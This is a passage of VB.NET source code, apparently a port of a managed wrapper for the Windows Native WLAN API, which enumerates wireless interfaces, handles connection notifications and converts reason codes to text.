            End Sub

            ''' <summary>
            ''' Gets the network interface of this wireless interface.
            ''' </summary>
            ''' <remarks>
            ''' The network interface allows querying of generic network properties such as the interface's IP address.
            ''' </remarks>
            Public ReadOnly Property NetworkInterface() As NetworkInterface
                Get
                    ' Do not cache the NetworkInterface; We need it fresh
                    ' each time cause otherwise it caches the IP information.
                    For Each netIface As NetworkInterface In NetworkInterface.GetAllNetworkInterfaces()
                        Dim netIfaceGuid As New Guid(netIface.Id)
                        If netIfaceGuid.Equals(info.interfaceGuid) Then
                            Return netIface
                        End If
                    Next
                    Return Nothing
                End Get
            End Property

            ''' <summary>
            ''' The GUID of the interface (same content as the <see cref="System.Net.NetworkInformation.NetworkInterface.Id"/> value).
            ''' </summary>
            Public ReadOnly Property InterfaceGuid() As Guid
                Get
                    Return info.interfaceGuid
                End Get
            End Property

            ''' <summary>
            ''' The description of the interface.
            ''' This is a user-immutable string containing the vendor and model name of the adapter.
            ''' </summary>
            Public ReadOnly Property InterfaceDescription() As String
                Get
                    Return info.interfaceDescription
                End Get
            End Property

            ''' <summary>
            ''' The friendly name given to the interface by the user (e.g. "Local Area Network Connection").
            ''' </summary>
            Public ReadOnly Property InterfaceName() As String
                Get
                    Return NetworkInterface.Name
                End Get
            End Property
        End Class

        Private clientHandle As IntPtr
        Private negotiatedVersion As UInteger
        Private wlanNotificationCallback As Wlan.WlanNotificationCallbackDelegate

        Private ifaces As New Dictionary(Of Guid, WlanInterface)()

        Public Sub New()
            Wlan.ThrowIfError(Wlan.WlanOpenHandle(Wlan.WLAN_CLIENT_VERSION_XP_SP2, IntPtr.Zero, negotiatedVersion, clientHandle))
            Try
                Dim prevSrc As Wlan.WlanNotificationSource
                wlanNotificationCallback = New Wlan.WlanNotificationCallbackDelegate(AddressOf OnWlanNotification)
                Wlan.ThrowIfError(Wlan.WlanRegisterNotification(clientHandle, Wlan.WlanNotificationSource.All, False, wlanNotificationCallback, IntPtr.Zero, IntPtr.Zero, _
                 prevSrc))
            Catch
                Wlan.WlanCloseHandle(clientHandle, IntPtr.Zero)
                Throw
            End Try
        End Sub

        Protected Overrides Sub Finalize()
            Try
                Wlan.WlanCloseHandle(clientHandle, IntPtr.Zero)
            Finally
                MyBase.Finalize()
            End Try
        End Sub

        Private Function ParseWlanConnectionNotification(ByRef notifyData As Wlan.WlanNotificationData) As System.Nullable(Of Wlan.WlanConnectionNotificationData)
            Dim expectedSize As Integer = Marshal.SizeOf(GetType(Wlan.WlanConnectionNotificationData))
            If notifyData.dataSize < expectedSize Then
                Return Nothing
            End If

            Dim connNotifyData As Wlan.WlanConnectionNotificationData = DirectCast(Marshal.PtrToStructure(notifyData.dataPtr, GetType(Wlan.WlanConnectionNotificationData)), Wlan.WlanConnectionNotificationData)
            If connNotifyData.wlanReasonCode = Wlan.WlanReasonCode.Success Then
                Dim profileXmlPtr As New IntPtr(notifyData.dataPtr.ToInt64() + Marshal.OffsetOf(GetType(Wlan.WlanConnectionNotificationData), "profileXml").ToInt64())
                connNotifyData.profileXml = Marshal.PtrToStringUni(profileXmlPtr)
            End If
            Return connNotifyData
        End Function

        Private Sub OnWlanNotification(ByRef notifyData As Wlan.WlanNotificationData, ByVal context As IntPtr)
            Dim wlanIface As WlanInterface = If(ifaces.ContainsKey(notifyData.interfaceGuid), ifaces(notifyData.interfaceGuid), Nothing)

            Select Case notifyData.notificationSource
                Case Wlan.WlanNotificationSource.ACM
                    Select Case DirectCast(notifyData.NotificationCode, Wlan.WlanNotificationCodeAcm)
                        Case Wlan.WlanNotificationCodeAcm.ConnectionStart, Wlan.WlanNotificationCodeAcm.ConnectionComplete, Wlan.WlanNotificationCodeAcm.ConnectionAttemptFail, Wlan.WlanNotificationCodeAcm.Disconnecting, Wlan.WlanNotificationCodeAcm.Disconnected
                            Dim connNotifyData As System.Nullable(Of Wlan.WlanConnectionNotificationData) = ParseWlanConnectionNotification(notifyData)
                            If connNotifyData.HasValue Then
                                If wlanIface IsNot Nothing Then
                                    wlanIface.OnWlanConnection(notifyData, connNotifyData.Value)
                                End If
                            End If
                            Exit Select
                        Case Wlan.WlanNotificationCodeAcm.ScanFail
                            If True Then

                            End If
                            Exit Select
                    End Select
                    Exit Select
                Case Wlan.WlanNotificationSource.MSM
                    Select Case DirectCast(notifyData.NotificationCode, Wlan.WlanNotificationCodeMsm)
                        Case Wlan.WlanNotificationCodeMsm.Associating, Wlan.WlanNotificationCodeMsm.Associated, Wlan.WlanNotificationCodeMsm.Authenticating, Wlan.WlanNotificationCodeMsm.Connected, Wlan.WlanNotificationCodeMsm.RoamingStart, Wlan.WlanNotificationCodeMsm.RoamingEnd, _
                         Wlan.WlanNotificationCodeMsm.Disassociating, Wlan.WlanNotificationCodeMsm.Disconnected, Wlan.WlanNotificationCodeMsm.PeerJoin, Wlan.WlanNotificationCodeMsm.PeerLeave, Wlan.WlanNotificationCodeMsm.AdapterRemoval
                            Dim connNotifyData As System.Nullable(Of Wlan.WlanConnectionNotificationData) = ParseWlanConnectionNotification(notifyData)
                            If connNotifyData.HasValue Then
                                If wlanIface IsNot Nothing Then
                                    wlanIface.OnWlanConnection(notifyData, connNotifyData.Value)
                                End If
                            End If
                            Exit Select
                    End Select
                    Exit Select
            End Select

            If wlanIface IsNot Nothing Then
                wlanIface.OnWlanNotification(notifyData)
            End If
        End Sub

        Public ReadOnly Property Interfaces() As WlanInterface()
            Get
                Dim ifaceList As IntPtr
                Wlan.ThrowIfError(Wlan.WlanEnumInterfaces(clientHandle, IntPtr.Zero, ifaceList))
                Try
                    Dim header As Wlan.WlanInterfaceInfoListHeader = DirectCast(Marshal.PtrToStructure(ifaceList, GetType(Wlan.WlanInterfaceInfoListHeader)), Wlan.WlanInterfaceInfoListHeader)
                    Dim listIterator As Int64 = ifaceList.ToInt64() + Marshal.SizeOf(header)
                    Dim interfaces__1 As WlanInterface() = New WlanInterface(header.numberOfItems - 1) {}
                    Dim currentIfaceGuids As New List(Of Guid)()
                    For i As Integer = 0 To header.numberOfItems - 1
                        Dim info As Wlan.WlanInterfaceInfo = DirectCast(Marshal.PtrToStructure(New IntPtr(listIterator), GetType(Wlan.WlanInterfaceInfo)), Wlan.WlanInterfaceInfo)
                        listIterator += Marshal.SizeOf(info)
                        Dim wlanIface As WlanInterface
                        currentIfaceGuids.Add(info.interfaceGuid)
                        If ifaces.ContainsKey(info.interfaceGuid) Then
                            wlanIface = ifaces(info.interfaceGuid)
                        Else
                            wlanIface = New WlanInterface(Me, info)
                        End If
                        interfaces__1(i) = wlanIface
                        ifaces(info.interfaceGuid) = wlanIface
                    Next


                    Dim deadIfacesGuids As New Queue(Of Guid)()
                    For Each ifaceGuid As Guid In ifaces.Keys
                        If Not currentIfaceGuids.Contains(ifaceGuid) Then
                            deadIfacesGuids.Enqueue(ifaceGuid)
                        End If
                    Next
                    While deadIfacesGuids.Count <> 0
                        Dim deadIfaceGuid As Guid = deadIfacesGuids.Dequeue()
                        ifaces.Remove(deadIfaceGuid)
                    End While

                    Return interfaces__1
                Finally
                    Wlan.WlanFreeMemory(ifaceList)
                End Try
            End Get
        End Property

        Public Function GetStringForReasonCode(ByVal reasonCode As Wlan.WlanReasonCode) As String
            Dim sb As New StringBuilder(1024)
            Wlan.ThrowIfError(Wlan.WlanReasonCodeToString(reasonCode, sb.Capacity, sb, IntPtr.Zero))
            Return sb.ToString()
        End Function
    End Class
End Namespace
#End Region ''Implements_Wifi_NameSpace